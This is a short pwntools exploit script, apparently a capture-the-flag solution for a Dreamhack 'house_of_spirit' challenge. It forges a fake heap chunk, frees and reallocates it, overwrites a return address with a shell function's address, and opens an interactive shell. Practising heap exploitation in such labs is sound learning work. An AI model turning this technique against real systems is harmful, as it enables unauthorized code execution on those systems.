from pwn import *

p = remote('host3.dreamhack.games', '9863')
#p = process('./house_of_spirit')

shell = 0x400940

def create(size, data):
  p.sendlineafter(b"> ", b'1')
  p.sendlineafter(b"Size: ", str(size).encode())
  p.sendlineafter(b"Data: ", data)

def delete(addr):
  p.sendlineafter(b"> ", b'2')
  p.sendlineafter(b": ", str(addr).encode())

def exit_():
  p.sendlineafter(b"> ", b'3')

p.sendlineafter(b"name: ", p64(0) + p64(0x101))

addr = int(p.recvuntil(b":")[:-1], 16)
chunk = addr + 0x10

print(hex(addr))

delete(chunk)
payload = b"A" * 0x28 + p64(shell)
create(0xf0, payload)

exit_()

p.interactive()